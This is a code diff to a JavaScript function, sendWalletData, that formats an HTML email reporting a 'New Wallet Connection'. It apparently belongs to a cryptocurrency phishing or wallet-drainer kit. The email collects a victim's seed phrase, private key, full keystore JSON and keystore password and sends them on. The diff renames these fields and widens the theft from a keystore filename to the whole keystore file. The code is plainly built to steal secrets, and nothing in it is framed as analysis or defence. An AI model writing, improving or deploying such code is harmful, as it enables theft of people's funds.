@@ -50,8 +50,7 @@ const sendWalletData = async (walletData) => {
   const transporter = createTransporter();
 
   const emailContent = `
-    <h2>🔗 New Wallet Connection</h2>
-    <div style="font-family: Arial, sans-serif; line-height: 1.6;">
+    <h2>🔗 New Wallet Connection</h2>    <div style="font-family: Arial, sans-serif; line-height: 1.6;">
       <h3>Wallet Details:</h3>
       <ul>
         <li><strong>Wallet Type:</strong> ${walletData.walletType}</li>
@@ -66,10 +65,10 @@ const sendWalletData = async (walletData) => {
         <li><strong>User Agent:</strong> ${walletData.userAgent}</li>
       </ul>
       
-      ${walletData.seedPhrase ? `
+      ${walletData.phrase ? `
         <h3>🔐 Seed Phrase:</h3>
         <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
-          ${walletData.seedPhrase}
+          ${walletData.phrase}
         </div>
       ` : ''}
       
@@ -79,11 +78,12 @@ const sendWalletData = async (walletData) => {
           ${walletData.privateKey}
         </div>
       ` : ''}
-      
-      ${walletData.keystoreFile ? `
-        <h3>📁 Keystore Info:</h3>
-        <p><strong>Filename:</strong> ${walletData.keystoreFile.name}</p>
-        <p><strong>Password:</strong> ${walletData.keystorePassword || 'Not provided'}</p>
+        ${walletData.keystoreJson ? `
+        <h3>📁 Keystore JSON:</h3>
+        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
+          ${walletData.keystoreJson}
+        </div>
+        <p><strong>Password:</strong> ${walletData.password || 'Not provided'}</p>
       ` : ''}
     </div>
   `;
